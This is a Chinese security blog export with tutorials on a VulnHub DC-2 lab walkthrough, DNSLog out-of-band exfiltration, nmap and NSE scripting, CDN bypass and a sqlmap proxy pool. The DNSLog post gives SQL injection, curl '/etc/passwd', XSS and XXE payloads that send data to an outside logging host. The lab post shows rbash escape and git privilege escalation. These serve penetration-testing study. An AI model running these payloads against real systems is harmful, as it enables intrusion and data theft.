{"meta":{"title":"Edsion's Blog","subtitle":"","description":"","author":"Edsion Shen","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2020-05-25T05:26:43.868Z","updated":"2020-05-25T05:26:43.868Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-05-25T05:40:33.763Z","updated":"2020-05-25T05:40:33.763Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-05-25T05:27:03.044Z","updated":"2020-05-25T05:27:03.044Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"request库使用","slug":"requests库","date":"2020-07-17T06:30:12.000Z","updated":"2020-07-17T06:31:54.418Z","comments":true,"path":"2020/07/17/requests库/","link":"","permalink":"http://yoursite.com/2020/07/17/requests%E5%BA%93/","excerpt":"","text":"构造请求 请求头 12headers=&#123;'Accept': 'application/vnd.github.v3.text-match+json'&#125;res = requests.get(url,headers) get请求 123456res = requests.get(url='https://api.github.com/search/repositories')参数# res = requests.get(url,params)# params=&#123;'q':'requests+language:python'&#125;# params=[('q', 'requests+language:python')]# params=b'q=requests+language:python' 其他请求方法 12345678910&gt;&gt;&gt; requests.post('https://httpbin.org/post', data=&#123;'key':'value'&#125;)&gt;&gt;&gt; requests.put('https://httpbin.org/put', data=&#123;'key':'value'&#125;)&gt;&gt;&gt; requests.delete('https://httpbin.org/delete')&gt;&gt;&gt; requests.head('https://httpbin.org/get')&gt;&gt;&gt; requests.patch('https://httpbin.org/patch', data=&#123;'key':'value'&#125;)&gt;&gt;&gt; requests.options('https://httpbin.org/get')消息体# data=&#123;'key':'value'&#125;# data=[('key', 'value')&#125;# json=&#123;'key':'value'&#125; 响应处理 响应状态码 1status = res.status_code 响应头信息（键不分大小写） 1requests_header=res.headers['content-type'] 响应内容 字节格式查看内容 12data = res.content# b'&#123;\\n \"current_user_url\": \"https://api.github.com/user\",\\n \"cur 字符串格式查看内容（序列化JSON） 12345因为对 bytes 解码到 str 需要一个编码格式，所以如果你没有指定，请求将尝试根据响应头来猜测编码格式res.encoding = 'utf-8'data=res.text# &#123;\"current_user_url\":\"https://api.github.com/user\",\"cur 字典形式内容（反序列化JSON） 123456data=res.json()# &#123;'current_user_url': 'https://api.github.com/user', 'curin提取内容repository = data['items'][0]也可以使用 .text 获取 str 并使用json.loads() 对其进行反序列化json.loads(data) 其他 检查请求 1234requests 库会在将请求实际发送到目标服务器之前准备该请求。 请求准备包括像验证头信息和序列化JSON内容等response.request.headers['Content-Type']response.request.urlresponse.request.body 身份验证 1234567891011使用auth 参数，rqeuests 将使用HTTP的基本访问认证方案来应用凭据&gt;&gt;&gt; from getpass import getpass&gt;&gt;&gt; requests.get('https://api.github.com/user', auth=('username', getpass()))成功返回&lt;Response [200]&gt;，失败返回&lt;Response [401]&gt;HTTPBasicAuth效果同上&gt;&gt;&gt; from requests.auth import HTTPBasicAuth&gt;&gt;&gt; from getpass import getpass&gt;&gt;&gt; requests.get('https://api.github.com/user', auth=HTTPBasicAuth('username', getpass()))requests 也提供了其他身份验证方法，例如 HTTPDigestAuth 和 HTTPProxyAuth 关闭SSL证书验证 1&gt;&gt;&gt; requests.get('https://api.github.com', verify=False) 性能 超时 123456789101112131415&gt;&gt;&gt; requests.get('https://api.github.com', timeout=1)还可以将元组传递给 timeout，第一个元素是连接超时（它允许客户端与服务器建立连接的时间），第二个元素是读取超时（一旦你的客户已建立连接而等待响应的时间）&gt;&gt;&gt; requests.get('https://api.github.com', timeout=(2, 5))超时异常import requestsfrom requests.exceptions import Timeouttry: response = requests.get('https://api.github.com', timeout=1)except Timeout: print('The request timed out')else: print('The request did not time out') Session对象 1234567Session 用于跨请求保留参数。 例如，如果要跨多个请求使用相同的身份验证,当你的应用程序想要再次连接到同一服务器时，它将重用池中的连接而不是建立新连接。import requestsfrom getpass import getpasswith requests.Session() as session: session.auth = ('username', getpass()) response = session.get('https://api.github.com/user') 最大重试 1234567891011121314151617通过 Transport Adapters，你可以为每个与之交互的服务定义一组配置。 例如，假设你希望所有对于https://api.github.com的请求在最终抛出 ConnectionError 之前重试三次。 你将构建一个 Transport Adapter，设置其 max_retries 参数，并将其装载到现有的 Sessionimport requestsfrom requests.adapters import HTTPAdapterfrom requests.exceptions import ConnectionErrorgithub_adapter = HTTPAdapter(max_retries=3)session = requests.Session()# Use `github_adapter` for all requests to endpoints that start with this URLsession.mount('https://api.github.com', github_adapter)try: session.get('https://api.github.com')except ConnectionError as ce: print(ce) 结尾 re库参考：https://juejin.im/post/5d8c630e51882511f444f65b","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"}],"tags":[{"name":"python库","slug":"python库","permalink":"http://yoursite.com/tags/python%E5%BA%93/"}]},{"title":"VulnHub渗透之DC-2","slug":"VulnHub渗透之DC-2","date":"2020-07-08T11:34:52.000Z","updated":"2020-07-08T11:34:47.378Z","comments":true,"path":"2020/07/08/VulnHub渗透之DC-2/","link":"","permalink":"http://yoursite.com/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/","excerpt":"","text":"0×00 说明 知识点：WordPress、受限shell、git提权 kali：192.168.101.10 靶机和kali处于同一局域网 0x01 信息收集 探测目标地址 命令：arp-scan -l 或者 nmap -sP 192.168.101.0/24 靶机地址为192.168.101.17 探测目标开放端口 命令：nmap -sV -p- 192.168.101.17 靶机开放了80端口和7744端口，7744为SSH，先访问下80 ts：需要先修改hosts文件，kali上的hosts位置在 /etc/hosts 0x02 Flag1 访问成功，使用wappalyzer查看下网站所使用的技术 网站为 WordPress CMS构建，并且发现第一个flag 123456789Flag 1:Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just can’t win them all.Log in as one to see the next flag.If you can’t find it, log in as another. 提示使用cewl工具，并且只有登陆之后才能看到下一个flag 0x03 Flag2 cewl工具可以根据url来生成对应的密码字典 命令：cewl -w /root/dic/dc2_passwd.txt http://dc-2/ 有了密码，接下来使用wpscan，它可以查询出wordpress的用户名，-e u是枚举用户名，默认从1-10 命令：wpscan --url http://dc-2/ -e u 接下来，找出 WordPress 登陆地址，可以网上查找或者工具去扫描 工具可以用dirb，命令：dirb http://dc-2/ 字典地址都具备了，使用wpscan进行爆破 命令：wpscan --url http://dc-2/wp-admin -U /root/dic/dc2_username.txt -P /root/dic/dc2_passwd.txt 爆破成功，结果如下： 123[!] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient 使用 jerry 登陆，找到了flag2 12345Flag 2:If you can&#39;t exploit WordPress and take a shortcut, there is another way.Hope you found another entry point. 意思是，WordPress行不通就换个方式 0x04 Flag3 于是想到之前还有个SSH服务，便尝试登陆，发现jerry无法登录，tom可以 ls 发现 flag3.txt 在当前目录下，但是使用 cat 却提示 -rbash: cat: command not found 这是一个受限shell环境，常见的受限shell环境类型包括rbash、rksh和rsh，于是现在需要绕过rbash，compgen还能使用，查看下当前可以执行的命令 命令：compgen -c 受限shell是LinuxShell限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现&gt; 了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。 大概清楚了，查看当前环境变量：echo $PATH，发现位于/home/tom/usr/bin下，用vi转义受限制的shell： 123vi:set shell&#x3D;&#x2F;bin&#x2F;bash:shell 然后设置环境变量： 12export PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:$PATHexport SHELL&#x3D;&#x2F;bin&#x2F;bash:$SHELL 成功绕过rbash，并读取了flag3.txt的内容 1Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 实际上，是要让我们切换 jerry 用户 0x05 Flag4 使用su jerry切换 jerry 用户，回到jerry的家目录查看，发现了flag4 1234567Good to see that you&#39;ve made it this far - but you&#39;re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you&#39;re on your own now. :-)Go on - git outta here!!!! 告诉我们只差最后一个flag了，还提示了 git 0x06 Flag5 其实是使用git进行提权 12sudo git help config!&#x2F;bin&#x2F;bash 拿到最后的 flag .","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://yoursite.com/tags/VulnHub/"}]},{"title":"通过DNSLog获取无回显信息","slug":"DNSLog","date":"2020-07-04T13:32:36.000Z","updated":"2020-07-04T14:15:22.583Z","comments":true,"path":"2020/07/04/DNSLog/","link":"","permalink":"http://yoursite.com/2020/07/04/DNSLog/","excerpt":"","text":"0x01 原理 NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析 DNS：域名解析服务器 A记录：指定域名对应的IP地址 一句话归纳😪😪： 将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。 案例解释 12ping &#96;whoami&#96;.test.com &#x2F;&#x2F;发出请求ping root.test.com &#x2F;&#x2F;实际请求 whoami在命令行中就自动解析了，所以其实是向root.test.com发出的请求，这时就会被DNS服务器所捕获，我们就能从日志中获取命令执行后的结果了。那到底怎么利用DNSLog进行注入呢？其实只要是能够发出请求的地方都可以用这种方式获取数据。 0x02 DNSLog平台 一、在线平台：http://ceye.io、http://www.dnslog.cn 二、自己搭建DNSLog服务器：https://github.com/BugScanTeam/DNSLog 三、 BurpSuite collaborator 点击Copy to Clipboard获取一个标识 比如我这里获取到的就是s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net 然后用这个外带就行了 0x03 DNSLog常用场景 SQL盲注 命令执行（无回显） XSS（无回显） SSRF(无回显) SQL盲注 以MySQL为例，在MySQL中有个一个load_file函数可以用来读取本地的文件。前提是root权限。 show variables like ‘%secure%’;查看load_file()可以读取的磁盘。 当secure_file_priv为空，就可以读取磁盘的目录。 当secure_file_priv为E:\\，就可以读取E盘的文件。 当secure_file_priv为null，load_file就不能加载文件。 ⚠️ 注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows——UNC路径。 UNC路径：UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。 平常在Widnows中用共享文件的时候就会用到这种网络地址的形式：\\\\sss.xxx\\test\\ 这也就解释了为什么CONCAT()函数拼接了4个\\了，因为转义的原因，4个就变\\成了2个\\，目的就是利用UNC路径。 ⚠️ 如果查询的数据中出现了非字母数字的特殊字符，需要进行转义，这里用16进制。原因是如果出现如逗号，@符号等特殊符号，不能形成标准的dns域名，无法发出数据。 几个例子 123456直接读取http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.4do468.ceye.io\\\\abc&#39;))),1,0)%23hex转码http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\\\abc&#39;))),1,0)%23取数据http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\\\abc&#39;))),1,0)%23 命令执行 Windows下 查看计算机名，其他类似 1ping %COMPUTERNAME%.xxx.ceye.io Linux下 查看当前用户和passwd文件，其他类似 12curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96; XSS 通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录： 1payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt; SSRF payload: 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;%remote;]&gt;&lt;root&#x2F;&gt; 0x04 总结 有些函数的使用具有操作系统的限制。 DNS查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。 避免一些特殊符号的产生，最好的选择就是数据先编码再带出。 注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。 有些操作是需要较高的权限。 🌈🌈 利用DNSLog攻击的方法，能更加简便、高效的进行渗透测试，并且拥有足够权限，可以直接拿下目标站点。","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"NMAP的使用","slug":"Nmap使用","date":"2020-06-27T06:53:22.000Z","updated":"2020-06-27T06:53:43.929Z","comments":true,"path":"2020/06/27/Nmap使用/","link":"","permalink":"http://yoursite.com/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"namp端口状态 123456Open(开放的): 应用程序正在这个端口上监听连接。losed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。 TCP标志位 123456SYN(synchronous建立联机)ACK(acknowledgement 确认)PSH(push传送)FIN(finish结束)RST(reset重置)URG(urgent紧急) nmap常用命令 轻量级扫描： 1234567nmap -sP 192.168.0.0/24 判断哪些主机存活nmap -sT 192.168.0.3 开放了哪些端口nmap -sS 192.168.0.127 开放了哪些端口（隐蔽扫描）nmap -sU 192.168.0.127 开放了哪些端口（UDP）nmap -sS -O 192.168.0.127 操作系统识别nmap -sT -p 80 -oG – 192.168.1.* | grep open列出开放了指定端口的主机列表nmap -sV -p 80 thief.one 列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等) 批量扫描： 123nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 -iL ip.txtnmap -sT -sV -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 --open --max-hostgroup 10 --max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt nmap参数 1234567891011121314151617181920212223242526272829303132333435nmap [Scan Type(s)] [Options] &#123;target specification&#125;scan type(s) 用于指定扫描类型options 用于指定选项target specification 用于指定扫描目标-s 指定扫描类型如下：-sP (ping扫描) *存活主机探测-sS (TCP SYN扫描 隐身扫描) *默认扫描方式，使用频率最高的半开放扫描-sT (tcp 扫描) *TCP connect()默认的扫描方式，完成三次握手-sU （UDP 扫描）用来探测目的的UDP端口，不需要发送任何的SYN包，发送UDP数据包到目的主机等待响应-sA （ACK扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用-sV （版本探测）-A 综合扫描（系统探测，版本探测，路由追踪以及一些常用脚本的扫描）-O （启用操作系统检测）-v详细选项说明-P0 [指定端口] (无ping扫描)-PU [指定端口] (udp ping扫描)-PS [指定端口] (TCP SYN ping 扫描)-PA [指定端口] (tcp ack ping扫描)-PI 使用真正的pingICMP echo请求来扫描目标主机是否正在运行-iL 指定扫描主机列表-iR 随机选择目标–exclude 排除扫描目标–excludefile 排除文件中目标列表-n (不用域名解析)-R (为所有目标解析域名)-T 时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢（5适合局域网）-F 快速扫描-e 指定网络接口-M 设置tcp扫描线程-iL 文件 指定一个文本内的所有主机nmap的输出：oN，oX，oS，oG（结果为一般模式。XML，kiddi3，grepable格式）nmap输出 ip：port 格式：nmap -vv -p 80 192.168.1.0/24 | grep “Discovered open port” | awk &#123;‘print $6”:”$4’&#125; | awk -F/ &#123;‘print $1’&#125; &gt; output.txt","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"NMAP","slug":"NMAP","permalink":"http://yoursite.com/tags/NMAP/"}]},{"title":"NSE编写","slug":"NSE编写","date":"2020-06-27T06:52:11.000Z","updated":"2020-06-27T06:53:26.030Z","comments":true,"path":"2020/06/27/NSE编写/","link":"","permalink":"http://yoursite.com/2020/06/27/NSE%E7%BC%96%E5%86%99/","excerpt":"","text":"NSE简介 Nmap 一款标志性的跨平台扫描器。它的原意为Network Mapper（网络映射器），具有相当强大的扫描功能。Nmap还可根据NSE (Nmap scripting Engine)的脚本进行大量渗透工作，这种脚本是基于Lua编程语言。正是NSE，使得Nmap不再普通。 Nmap的目录结构 Linux Windows 主要关注两个目录： neslib存放着各种库文件 script存放着NSE脚本 nmap脚本和库文件手册：https://nmap.org/nsedoc/ NSE中的库文件 NSE中的库文件实现了代码的分离和重构，有助于脚本的开发，其存放在nselib文件夹中。 库文件的编写 创建一个库文件保存为demo.lua，用于对于传入的参数 返回 这个端口 是开启的。 123function Test( port ) return string.format(&quot;The port &#39;%s&#39; is open&quot;,port)end 在脚本文件中引入这个库文件，引入库文件的格式一般为 local 库文件名 = require “库文件名” 业界人士称，在lua中，如果是一些经常用到的全局函数，可以申明为local局部变量，这样做可以提升效率。 在脚本中使用此库文件中的函数。 123456789101112local shortport &#x3D; require &quot;shortport&quot;local demo &#x3D; require &quot;demo&quot;description &#x3D; [[neslib demo test]]categories &#x3D; &#123;&quot;default&quot;&#125;portrule &#x3D; function(host,port) return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 30081 and port.state &#x3D;&#x3D;&quot;open&quot;endaction &#x3D; function(host, port) return Test(port.number)end NSE编写规则 NSE脚本编写流程 大致分为四步： 导入脚本所需库 脚本描述信息及分类 rule类型：脚本的触发规则 action：脚本具体执行内容，rule触发规则为真时执行action定义的函数 Rule四种类型 Rule：用于描述脚本的触发规则，返回值只有true和false两种。返回值决定了后面action对应的函数是否执行，注意：true(执行),flase(不执行)。它有四种类型分别是 prerule()：不接收参数，脚本只运行一次，在主机发现之前，发生在预扫描阶段。返回的值永远为真。 hostrule(host)：设定参数为目标的ip地址或主机名，nmap完成了主机发现之后再运行脚本。 portrule(host,port)：设定参数需要主机以及端口。在端口扫描时，每个端口运行一次，处于open，open|filtered，或者unfiltered状态的所有端口。 postrule()：不接收参数，nmap完成所有主机已经被扫描后，在脚本的后扫描阶段。返回的值永远为真。 举个例子： 在扫描之前触发脚本，打印I Love China. 12345678910111213description = [[test]]author = \"Edsion\"license = \"Same as Nmap‐‐See http://nmap.org/book/man‐legal.html\"categories = &#123;\"default\",\"safe\"&#125;prerule = function(host,port)return trueendaction = function(host, port)return \"I Love China.\"end 调试模式 在测试阶段我们难免会出现错误,那假设我们出现了错误我们应该如何解决呢。这时我们需要借助Nmap的调试模式进行调试，只需要加上-d选项即可进入调试模式，那一般选择-d 3，3代表的是等级，等级越高，越详细。 nmap API nmap中API的核心功能就是向脚本提供主机和端口的信息。 两个lua table类型的参数：host table 、 port table host table类型 host.os 操作系统信息 host.ip tagret(目标主机)对应的ip,例如下面的127.0.0.1 host.name tagert在命令行对应的名字，例如下面的zzcms.im host.targetname 同上host.name，我个人是这样认为的 host.directly_connected 判断目标主机是否与本机在同一个子网 host.mac_addr mac地址 （必须是同一子网的设备这个命令才有效） port table类型 port.number 端口号 port.protocol 协议 port.service 服务 http或https port.version 版本信息 port.state 端口状态 http库参数扩展 http 库 get() 发起get请求，请求结果以一个table的形式返回 host 要请求的主机 path 要检索的路径 options 可选，允许调用者控制socket,请求头的table port 要检索的端口 post() 发起post请求，请求结果以一个table的形式返回 ignored 向后兼用，一般填写nil，忽略即可 postdata post数据，字符串或者table格式 host 要请求的主机 path 要检索的路径 options 可选，允许调用者控制socket,请求头,超时时间的table port 要检索的端口 NSE脚本分类 脚本类别 描述 auth 与用户认证相关的NSE脚本 broadcast 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务 brute 暴力破解 default 默认，执行脚本（-A或者-sC） discovery 与主机和服务发现相关的脚本 dos 与拒绝服务攻击有关的脚本 exploit 利用已知的漏洞入侵系统 external 利用第三方的数据库或资源，例如进行whois解析 fuzzer 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽 malware 探测目标机是否感染了病毒、开启了后门等信息 safe 此类与intrusive相反，属于安全性脚本 vuln 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 version 负责增强服务与版本扫描（Version Detection）功能的脚本 NSE脚本使用 123456789101112131415161718192021直接加脚本名称nmap --script http-title &lt;target&gt;nmap --script http-title，http-methods &lt;target&gt;类别nmap --script exploit &lt;target&gt;您也可以用逗号分隔它们来运行多个类别：nmap --script discovery,intrusive &lt;target&gt;路径或文件名（文件夹）nmap --script /path/to/script.nse &lt;target&gt;nmap --script /path/to/script.nse,/another/path/script2.nse &lt;target&gt;表达式nmap -sV --script \"not exploit\" &lt;target&gt;nmap --script \"not（intrusive or dos or exploit）\" -sV &lt;target&gt;通配符nmap --script \"snmp- *\" &lt;target&gt;为脚本提供参数 --script-args=x=x,y=y","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"NMAP","slug":"NMAP","permalink":"http://yoursite.com/tags/NMAP/"}]},{"title":"绕过CDN寻找真实IP","slug":"绕过CDN","date":"2020-06-23T04:17:11.000Z","updated":"2020-07-04T14:05:44.404Z","comments":true,"path":"2020/06/23/绕过CDN/","link":"","permalink":"http://yoursite.com/2020/06/23/%E7%BB%95%E8%BF%87CDN/","excerpt":"","text":"目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。 一、DNS历史解析记录 查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有： 123456iphistory：https://viewdns.info/iphistory/DNS查询：（https://dnsdb.io/zh-cn/）微步在线：（https://x.threatbook.cn/）域名查询：（https://site.ip138.com/）DNS历史查询：（https://securitytrails.com/）Netcraft：https://sitereport.netcraft.com/?url=github.com 二、子域名 很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： 搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 在线查询网站： 12345http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F; http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;https:&#x2F;&#x2F;www.virustotal.com&#x2F; 子域名爆破工具 1234Layer子域名挖掘机wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r 三、网站邮件头信息 比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。 四、网络空间安全引擎搜索 通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。 123钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.orgShodan：https:&#x2F;&#x2F;www.shodan.ioFofa：https:&#x2F;&#x2F;fofa.so 五、利用SSL证书 证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。 SSL证书搜索引擎： 1https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com 六、国外主机解析域名 大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。 国外多PING测试工具： 1234https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.phphttp:&#x2F;&#x2F;host-tracker.com&#x2F;http:&#x2F;&#x2F;www.webpagetest.org&#x2F;https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F; 七、全网扫描 通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。 ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。 1https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。 1https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan 八、配置不当导致绕过 在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。 案例1：为了方便用户访问，我们常常将www.test.com 和 test.com 解析到同一个站点，而CDN只配置了www.test.com，通过访问test.com，就可以绕过 CDN 了。 案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"SqlMap代理池","slug":"代理池","date":"2020-06-22T07:16:21.000Z","updated":"2020-06-22T07:23:05.708Z","comments":true,"path":"2020/06/22/代理池/","link":"","permalink":"http://yoursite.com/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/","excerpt":"","text":"获取代理池 获取代理池使用了GIthub上的项目：https://github.com/jhao104/proxy_pool ，并利用REDIS存储获取到的代理地址 启动项目 在cli目录下通过ProxyPool.py启动 12345# 首先启动调度程序&gt;&gt;&gt;python proxyPool.py schedule# 然后启动webApi服务&gt;&gt;&gt;python proxyPool.py webserver Api 启动过几分钟后就能看到抓取到的代理IP，可以直接到数据库中查看，也可以通过api访问http://127.0.0.1:5010 查看。 api method Description arg / GET api介绍 None /get GET 随机获取一个代理 None /get_all GET 获取所有代理 None /get_status GET 查看代理数量 None /delete GET 删除代理 proxy=host:ip 保存代理 自己编写了个小脚本将ProxyPool.py获取到的代理保存在ips.txt中 get_proxy.py： 1234567891011121314151617import requestsdef get_proxy(): return requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_all&#x2F;&quot;).json()def delete_proxy(proxy): requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;delete&#x2F;?proxy&#x3D;&#123;&#125;&quot;.format(proxy))res &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_status&quot;).json()count &#x3D; res.get(&quot;useful_proxy&quot;)print(&quot;目前代理池中共计：%s个代理.&quot; % count)f &#x3D; open(&quot;ips.txt&quot;, &quot;w&quot;)for i in range(count): b &#x3D; get_proxy()[i][&quot;proxy&quot;]f.write(b + &quot;\\n&quot;)f.close() 本地代理转发 借用前人的成果，实现的效果是启用本地127.0.0.1:9999服务，将ips.txt内的代理转发给本地客户端 ips.py： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#!/usr/bin/env python# -*- coding: utf-8 -*-import socketfrom socket import errorimport threadingimport randomimport timelocaltime = time.asctime(time.localtime(time.time()))class ProxyServerTest: def __init__(self, proxyip): # 本地socket服务 self.ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.proxyip = proxyip def run(self): try: # 本地服务IP和端口 self.ser.bind(('127.0.0.1', 9999)) # 最大连接数 self.ser.listen(5) except error as e: print(\"[-]The local service : \" + str(e)) return \"[-]The local service : \" + str(e) while True: try: # 接收客户端数据 client, addr = self.ser.accept() print('[*]accept %s connect' % (addr,)) data = client.recv(1024) if not data: break print('[*' + localtime + ']: Accept data...') except error as e: print(\"[-]Local receiving client : \" + str(e)) return \"[-]Local receiving client : \" + str(e) while True: # 目标代理服务器，将客户端接收数据转发给代理服务器 mbsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) iplen = len(self.proxyip) proxyip = self.proxyip[random.randint(0, iplen - 1)] print(\"[!]Now proxy ip:\" + str(proxyip)) prip = proxyip[0] prpo = proxyip[1 try: mbsocket.settimeout(3) mbsocket.connect((prip, prpo)) except: print(\"[-]RE_Connect...\") continue break # except : # print(\"[-]Connect failed,change proxy ip now...\") # pass try: mbsocket.send(data) except error as e: print(\"[-]Sent to the proxy server : 